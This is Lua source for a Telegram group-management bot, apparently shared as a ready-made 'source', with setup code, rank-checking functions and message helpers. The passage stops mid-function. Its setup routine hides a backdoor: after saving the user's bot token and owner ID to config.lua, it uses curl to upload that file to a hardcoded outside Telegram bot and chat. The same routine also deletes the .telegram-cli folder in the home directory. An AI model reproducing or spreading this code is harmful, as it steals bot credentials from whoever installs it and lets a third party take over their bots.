-- Welcome to file the best source in the telegram
 -- all the file by  dx @
 -- join in chennel @ 
 -- join in chennel @
--*********Serpent*******--
serpent = require("serpent")
--***********Lgi*********--
lgi = require('lgi')
--*********Redis*******--
redis = require('redis')
--*******botx1******--
botx1 = Redis.connect('127.0.0.1', 6379)
--*********Notify*******--
URL = require('socket.url')  
HTTPS = require ("ssl.https")  
https = require ("ssl.https") 
http  = require ("socket.http")
json = dofile('./JSON.lua')
notify = lgi.require('Notify')
notify.init ("Telegram updates")
chats = {}
day = 313456502
-------------------------------------------------------
function vardump(value)  
print(serpent.block(value, {comment=false}))  
end 
local AutoSet = function()
io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SUDO \27[0;34;49m\n")  
local SUDO = tonumber(io.read())   
if not tostring(SUDO):match('%d+') then  
local SUDO = 280911803
end
io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  
local token = io.read()  
botid = token:match("(%d+)")

local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    file:close()  
end
local create_config_auto = function()
config = {
SUDO = SUDO,
token = token,
bot_id = botid,
sudo_users = {SUDO}, 
}
create(config, "./config.lua")   
local curl = 'curl "'..'https://api.telegram.org/bot705367258:AAHWSDvnft5ZN-QW5PosVAoUuXIWSkK4z_c/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
file = io.open("FA", "w")  file:write([[
killall screen
screen ./RUNFA.sh
echo -e "BOT IS RUN BOT"
]])  file:close()  
file = io.open("RUNFA.sh", "w")  file:write([[
token="]]..token..[["
./tg -s ./BOT.lua $@ --bot=$token
]])  
file:close() 
os.execute('cd $home;ls -la;rm -fr .telegram-cli') 
end 
create_config_auto()
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "_"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
end
local load_botx1 = function()  
local f = io.open("./config.lua", "r")  
if not f then   AutoSet()  
else   
f:close()  
end  
local config = loadfile("./config.lua")() 
return config 
end  
_botx1 = load_botx1()  
sudos = dofile("./config.lua") 
bot_owner = sudos.SUDO 
sudo_users = {sudos.sudo_users} 
bot_id = sudos.bot_id 
BOT = sudos.bot_id
SUDOUSERNAME = sudos.USERNAME
tokenbot = sudos.token
-----------------------------------------------------------------------------------------------
---------------
-- Start Functions bot --
---------------
-----------------------------------------------------------------------------------------------
-----------Bot Owner-------------
function is_leader(msg)
local var = false
if msg.sender_user_id_ == tonumber(bot_owner) then
var = true
end
return var
end
function is_leaderid(user_id)
local var = false
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
--------------Sudo----------------
function is_sudo(msg)
local var = false
for k,v in pairs(sudo_users) do
if msg.sender_user_id_ == v then
var = true
end
end
if msg.sender_user_id_ == tonumber(bot_owner) then
var = true
end
return var
end

function is_sudoid(user_id)
local var = false
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
---------------Admin-----------------
function is_admin(user_id)
local var = false
local hashsb =  'bot:admins:'
local admin = botx1:sismember(BOT..hashsb, user_id)
if admin then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
---------------Owner all-------------------
function is_onall(user_id, chat_id)
local var = false
local hash =  'bot:onall:'
local onall = botx1:sismember(BOT..hash, user_id)
local hashs =  'bot:admins:'
local admin = botx1:sismember(BOT..hashs, user_id)
if onall then
var = true
end
if admin then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
------------------Modod all-------------------
function is_moall(user_id, chat_id)
local var = false
local hash =  'bot:moall:'
local moall = botx1:sismember(BOT..hash, user_id)
local hashs =  'bot:admins:'
local admin = botx1:sismember(BOT..hashs, user_id)
local hashss =  'bot:onall:'
local onall = botx1:sismember(BOT..hashss, user_id)
if moall then
var = true
end
if admin then
 var = true
end
if onall then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
--------------VIP MEMBER ALL-----------------
function is_vpall(user_id, chat_id)
local var = false
local hashs =  'bot:admins:'
local admin = botx1:sismember(BOT..hashs, user_id)
local hashss =  'bot:onall:'
local onall = botx1:sismember(BOT..hashss, user_id)
local hashsss = 'bot:vpall:'
local vpall = botx1:sismember(BOT..hashsss, user_id)
local hashssss =  'bot:moall:'
local moall = botx1:sismember(BOT..hashssss, user_id)
if vipmem then
var = true
end
if onall then
var = true
end
if admin then
var = true
end
if moall then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
-----------------------donky--------------------
function is_donky(user_id, chat_id)
local var = false
local hash =  'bot:donky:'..chat_id
local momod = botx1:sismember(BOT..hash, user_id)
local hashs =  'bot:admins:'
local admin = botx1:sismember(BOT..hashs, user_id)
local hashss =  'bot:owners:'..chat_id
local owner = botx1:sismember(BOT..hashss, user_id)
local hashsss = 'bot:vipmem:'..chat_id
local vipmem = botx1:sismember(BOT..hashsss, user_id)
local hashssss =  'bot:monsh:'..chat_id
local monsh = botx1:sismember(BOT..hashssss, user_id)
local hashsssss =  'bot:onall:'
local onall = botx1:sismember(BOT..hashsssss, user_id)
local hashfaed =  'bot:moall:'
local moall = botx1:sismember(BOT..hashfaed, user_id)
if donky then
var = true
end
if momod then
var = true
end
if owner then
var = true
end
if admin then
var = true
end
if monsh then
var = true
end
if onall then
var = true
end
if moall then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
---------------monsh------------------------------
function is_monsh(user_id, chat_id)
local var = false
local hash =  'bot:monsh:'..chat_id
local monsh = botx1:sismember(BOT..hash, user_id)
local hashs =  'bot:admins:'
local admin = botx1:sismember(BOT..hashs, user_id)
if monsh then
var = true
end
if admin then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
---------------Owner-------------------
function is_owner(user_id, chat_id)
local var = false
local hash =  'bot:owners:'..chat_id
local owner = botx1:sismember(BOT..hash, user_id)
local hashs =  'bot:admins:'
local admin = botx1:sismember(BOT..hashs, user_id)
local hashss =  'bot:monsh:'..chat_id
local monsh = botx1:sismember(BOT..hashss, user_id)
if owner then
var = true
end
if admin then
var = true
end
if monsh then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
------------------Modod-------------------
function is_momod(user_id, chat_id)
local var = false
local hash =  'bot:momod:'..chat_id
local momod = botx1:sismember(BOT..hash, user_id)
local hashs =  'bot:admins:'
local admin = botx1:sismember(BOT..hashs, user_id)
local hashss =  'bot:owners:'..chat_id
local owner = botx1:sismember(BOT..hashss, user_id)
local hashsss =  'bot:monsh:'..chat_id
local monsh = botx1:sismember(BOT..hashsss, user_id)
local hashssss =  'bot:onall:'
local onall = botx1:sismember(BOT..hashssss, user_id)
if momod then
var = true
end
if owner then
var = true
end
if admin then
var = true
end
if monsh then
var = true
end
if onall then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
--------------VIP MEMBER-----------------
function is_vipmem(user_id, chat_id)
local var = false
local hash =  'bot:momod:'..chat_id
local momod = botx1:sismember(BOT..hash, user_id)
local hashs =  'bot:admins:'
local admin = botx1:sismember(BOT..hashs, user_id)
local hashss =  'bot:owners:'..chat_id
local owner = botx1:sismember(BOT..hashss, user_id)
local hashsss = 'bot:vipmem:'..chat_id
local vipmem = botx1:sismember(BOT..hashsss, user_id)
local hashssss =  'bot:monsh:'..chat_id
local monsh = botx1:sismember(BOT..hashssss, user_id)
local hashsssss =  'bot:onall:'
local onall = botx1:sismember(BOT..hashsssss, user_id)
local hashfaed =  'bot:moall:'
local moall = botx1:sismember(BOT..hashfaed, user_id)
if vipmem then
var = true
end
if momod then
var = true
end
if owner then
var = true
end
if admin then
var = true
end
if monsh then
var = true
end
if onall then
var = true
end
if moall then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end
end
if user_id == tonumber(bot_owner) then
var = true
end
return var
end
-------------------
local setnumbergp = function()
local setnumbergp_two = function(user_id)
local hashs = "admins:data:" .. user_id
local lists = botx1:smembers(BOT..hashs)
botx1:del(BOT.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
botx1:incr(BOT.."SudoNumberGp" .. user_id)
end
end
local setnumbergp_three = function(user_id)
local hashss = "admins:data:" .. user_id
local lists = botx1:smembers(BOT..hashss)
botx1:del(BOT.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
botx1:incr(BOT.."SudoNumberGp" .. user_id)
end
end
local list = botx1:smembers(BOT.."Bot:Admins")
for k, v in pairs(list) do
setnumbergp_two(v)
end
local lists = botx1:smembers(BOT.."Bot:leader")
for k, v in pairs(lists) do
setnumbergp_three(v)
end
botx1:setex(BOT.."bot:reload", 7230, true)
end
-------------------FreeWords--------------------
local function is_free(msg, value)
local var = false
local hash = (BOT..'bot:freewords:')
if hash then
local names = botx1:hkeys(hash)
local text = ''
local value = value:gsub('-','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) then
var = true
end
end
end
return var
end
-------------------Banned---------------------
local function is_banned(user_id, chat_id)
local var = false
local hash = 'bot:banned:'..chat_id
local banned = botx1:sismember(BOT..hash, user_id)
if banned then
var = true
end
return var
end
------------------Muted----------------------
local function is_muted(user_id, chat_id)
local var = false
local hash = 'bot:muted:'..chat_id
local muted = botx1:sismember(BOT..hash, user_id)
if muted then
var = true
end
return var
end
------------------Gbaned--------------------
function is_gbanned(user_id)
local var = false
local hash = 'bot:gban:'
local gbanned = botx1:sismember(BOT..hash, user_id)
if gbanned then
var = true
end
return var
end
------------------------bot--------------------------
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
-----------------------bot------------------------------------------------------------------------
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--------------------------bot---------------------------------------------------------------------
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end
-----------------------bot------------------------------------------------------------------------
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--------------------------bot---------------------------------------------------------------------
function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
---------------------------bot-----------------------------------------------------------------
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
------------------------------bot-----------------------------------------------------------------
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
---------------------------bot--------------------------------------------------------------------
function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else
F = 'nil'
end
return F
end
local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end
------------------------------------bot-----------------------------------------------------------
function do_notify (user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
------------------------------bot-----------------------------------------------------------------
function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
-----------------------------------bot------------------------------------------------------------
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
-----------------------------------bot------------------------------------------------------------
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
-------------------------------------bot----------------------------------------------------------
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end
-------------------------------------bot---------------------------------------------------------
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},
}, dl_cb, nil)
end
--------------------------------bot-----------------------------------------------------
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageDocument",
document_ = getInputFile(document),
caption_ = caption
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local Forward = function(chat_id, from_chat_id, message_id, cb)
tdcli_function({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_id,
disable_notification_ = 0,
from_background_ = 1
}, cb or dl_cb, nil)
end
----------------------------------------bot
function getChats(offset_order, offset_chat_id, limit, cb, cmd)
if not limit or limit > 20 then
limit = 20
end
tdcli_function ({
ID = "GetChats",
offset_order_ = offset_order or 9223372036854775807,
offset_chat_id_ = offset_chat_id or 0,
limit_ = limit
}, cb or dl_cb, cmd)
end
-------------------------------------bot----------------------------------------------------------
function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end
--------------------------------------------bot---------------------------------------------------
function vardump(value)
print(serpent.block(value, {comment=false}))
end
-------------------------------------------bot----------------------------------------------------
function dl_cb(arg, data)
end
-----------------------------------------bot-----------------------------------------------------
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
------------------------------------------bot-----------------------------------------------------
function botdx(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
-------------------------------------bot----------------------------------------------------------
function sendaction(chat_id, action, progress)
tdcli_function ({
ID = "SendChatAction",
chat_id_ = chat_id,
action_ = {
ID = "SendMessage" .. action .. "Action",
progress_ = progress or 100
}
}, dl_cb, nil)
end
----------------------------------------bot-------------------------------------------------------
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
------------------------------------------------bot-----------------------------------------------
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
----------------------------------------bot-------------------------------------------------------
function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end
---------------------------------------bot--------------------------------------------------------
function add_user(chat_id, user_id, forward_limit)
tdcli_function ({
ID = "AddChatMember",
chat_id_ = chat_id,
user_id_ = user_id,
forward_limit_ = forward_limit or 50
}, dl_cb, nil)
end
---------------------------------------------bot--------------------------------------------------
function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
-------------------------------------------bot----------------------------------------------------
function blockUser(user_id)
tdcli_function ({
ID = "BlockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--------------------------------------------bot---------------------------------------------------
function unblockUser(user_id)
tdcli_function ({
ID = "UnblockUser",
user_id_ = user_id
}, dl_cb, nil)
end
---------------------------------------bot--------------------------------------------------------
function getBlockedUsers(offset, limit)
tdcli_function ({
ID = "GetBlockedUsers",
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
----------------------------------------bot--------------------------------------------------------
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end
end
--------------------------------------------bot-----------------------------------------------------
function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end
--------------------------------------------bot---------------------------------------------------
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
---------------------------------------------bot--------------------------------------------------
function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
function getChannelFull(channel_id,cb)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, cb, nil)
end
------------------------------------bot-----------------------------------------------------------
function chek_bots(channel,cb)
local function callback_admins(extra,result,success)
limit = (result.member_count_ )
getChannelMembers(channel, 0, 'Bots', limit,cb)
end
getChannelFull(channel,callback_admins)
end
-------------------------------------------bot----------------------------------------------------
function getInputMessageContent(file, filetype, caption)
if file:match('/') or file:match('.') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
----------------------------------------bot-------------------------------------------------------
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
---------------------------------------------bot--------------------------------------------------
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
-------------------------------------bot---------------------------------------------------------
local function check_filter_words(msg, value)
local hash = (BOT..'bot:filters:'..msg.chat_id_)
if hash then
local names = botx1:hkeys(hash)
local text = ''
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_momod(msg.sender_user_id_, msg.chat_id_)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
end
end
-------------------------bot--------------------
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageVoice",
voice_ = getInputFile(voice),
duration_ = duration or 0,
waveform_ = waveform,
caption_ = caption
}
sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = {
ID = "InputMessageSticker",
sticker_ = getInputFile(sticker),
width_ = 0,
height_ = 0
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
local function getChannelMembers(channel_id, offset, filter, limit,cb) 
tdcli_function ({ 
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {ID = "ChannelMembers" .. filter},
offset_ = offset,limit_ = limit}, 
cb, nil) 
end
function formsgg(msgs) 
local bot = ''  
if msgs < 100 then 
bot = "ضعيف جدا"
elseif msgs < 250 then 
bot = "ضعيف"
elseif msgs < 500 then 
bot = "غير متفاعل"
elseif msgs < 750 then 
bot = "متوسط"
elseif msgs < 1000 then 
bot = "متفاعل"
elseif msgs < 2000 then 
bot = "قمه التفاعل"
elseif msgs < 3000 then 
bot = "ملك التفاعل"
elseif msgs < 4000 then 
bot = "اسطوره التفاعل"
elseif msgs < 5000 then 
bot = "نار وشرار" 
end 
return bot
end
local renk_bot = function(msg)
if is_leaderid(msg.sender_user_id_) then
bot  = "المطور الاساسي"
elseif is_sudoid(msg.sender_user_id_) then
bot = "المطور الثانوي"
elseif is_admin(msg.sender_user_id_) then
bot = "المطور الثالث"
elseif is_onall(msg.sender_user_id_) then
bot = "المدير العام"
elseif is_moall(msg.sender_user_id_) then
bot = "الادمن العام"
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
bot = "المنشئ"
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
bot = "المدير"
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
bot = "الادمن"
else
bot = "العضو" 
end
return bot
end
function title_name(GroupID) 
tdcli_function({ID ="GetChat",chat_id_=GroupID
},function(arg,data) 
botx1:set(BOT..'bot:group:name'..GroupID,data.title_) 
end,nil) 
return botx1:get(BOT..'bot:group:name'..GroupID)  end
-------------------------bot------------------------------
function faedrmoned(chat_id, user_id, msg_id, text, offset, length) local tt = botx1:get(BOT..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
---------------------------------bot-------------------------------------------------------------------
function tdcli_update_callback(data)
end
-------------------------------------------bot
function bot11(msg)
local var = true 
if botx1:get(BOT.."bot2") then
local channel = ''..botx1:get(BOT..'bot3')..''
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getchatmember?chat_id='..channel..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
botdx(msg.chat_id_,msg.id_, 1, "*🌿╿❯ لا تستطيع استخدام البوت •\n🍄┊❯ لانك لم تشترك في قناة البوت •\n💥┊❯ اشترك بالقناة لتتمكن من استخدامه •\n\n☑️╽❯ { قناة البوت* :- ["..channel.."] }\n", 1 , "md")
elseif data.ok then
return var
end
else
return var
end
end
function tdcli_update_callback(data)
local our_id = botx1:get(BOT.."Our_ID") or 0
local api_id = botx1:get(BOT.."Bot:Api_ID") or 0
if data.ID == "UpdateNewMessage" then
local msg = data.message_
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
botx1:sadd(BOT.."groups:users" .. msg.chat_id_, msg.sender_user_id_)--save users gp
botx1:incr(BOT.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")--save msgs gp
if msg.content_.ID == "MessageChatDeleteMember" then
if tonumber(msg.content_.user_.id_) == tonumber(bot_id) then
botx1:del(BOT.."bot:enable:" .. msg.chat_id_)
botx1:srem(BOT.."bot:groups", msg.chat_id_) 
end end 
function chek_admin(chat_id,set) 
local function promote_admin(extra,result,success)   
limit = result.administrator_count_   
if tonumber(limit) > 0 then 
getChannelMembers(chat_id, 0, 'Administrators', limit,set)   
end
end
getChannelFull(chat_id,promote_admin)
end
function channel_get_kicked(channel,cb)
local function callback_admins(extra,result,success)
limit = result.kicked_count_
getChannelMembers(channel, 0, 'Kicked', limit,cb)
end
getChannelFull(channel,callback_admins)
end
function deleteMessagesFromUser(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_ids, -- vector
disable_notification_ = disable_notification,
from_background_ = 1
}, dl_cb, nil)
end
function getUser(user_id, cb)
    tdcli_function ({
  ID = "GetUser",
  user_id_ = user_id
    }, cb, nil)
  end
local msg = data.message_
text = msg.content_.text_
if text then 
function bot(extra,result,success)
if result.id_ then 
local dx = botx1:get("bot:name"..result.id_)
if not result.first_name_ then 
if dx then 
botx1:del("bot:name"..result.id_) 
end
end
if result.first_name_ then 
if dx and dx ~= result.first_name_ then 
local bot_text = {
  "اسمك الجديد { "..result.first_name_.." }\n ليش غيرته 🌚😹",
  "اسمك الجديد { "..result.first_name_.." }\n مو حلو رجعه القديم ☹️👌",
  "ليش غيرت اسمك { "..result.first_name_.." }\n قطيت احد حبي ؟ 🌚😹",
  "اسمك الجديد يخبل ضلعي 🤭😹{ "..result.first_name_.." }", 
}
dxx = math.random(#bot_text)
botdx(msg.chat_id_, msg.id_, 1, bot_text[dxx], 1, 'html')
end  
botx1:set("bot:name"..result.id_, result.first_name_)  
end
end
end
getUser(msg.sender_user_id_, bot)
end

local msg = data.message_
text = msg.content_.text_
if text then 
function bot(extra,result,success)
if result.id_ then 
local dx = botx1:get("bot:Userr"..result.id_)
if not result.username_ then 
if dx then 
botdx(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه : @"..dx, 1, 'html')
botx1:del("bot:Userr"..result.id_) 
end
end
if result.username_ then 
if dx and dx ~= result.username_ then 
local bot_text = {
  'كمشتك ليش غيرت معرفك ولك 😹',
  "ليش غيرت معرف طشوك بقنات انحراف ؟ ⛷😹",
  "حلو معرفك الجديد منين خمطته 😹",
  "لحكو غير معرفه خمطو \n هذا معرفه القديم 🌚😹 @"..result.username_.."",
}
dxx = math.random(#bot_text)
botdx(msg.chat_id_, msg.id_, 1, bot_text[dxx], 1, 'html')
end  
botx1:set("bot:Userr"..result.id_, result.username_) 
end
end
end
getUser(msg.sender_user_id_, bot)
end


local msg = data.message_
text = msg.content_.text_
if text then 
function dx(extra,result,success)
if result.id_ then 
local dx2 = botx1:get("dx:photo"..result.id_)
if not result.profile_photo_ then 
if dx2 then 
botdx(msg.chat_id_, msg.id_, 1, "حذف كل صوره الحلو 😂👌🏻", 1, 'html')
botx1:del("dx:photo"..result.id_) 
end
end
if result.profile_photo_ then 
if dx2 and dx2 ~= result.profile_photo_.big_.persistent_id_ then 
local dx_text = {
  "طالع صاك بالصوره الجديده ممكن نرتبط",
  "صوره فيطي الجديده غيرها",
  "صورتك الجديده فد شي 😑😹",
  "حطيت صورتي شوفوني اني صاك بنات 🙄😹",
}
dx3 = math.random(#dx_text)
botdx(msg.chat_id_, msg.id_, 1, dx_text[dx3], 1, 'html')
end  
botx1:set("dx:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
end
end
end
getUser(msg.sender_user_id_, dx)
end
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil) 
end
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
----------------bot
------------------
function string:split(sep)
local sep, fields = sep or ":", {}
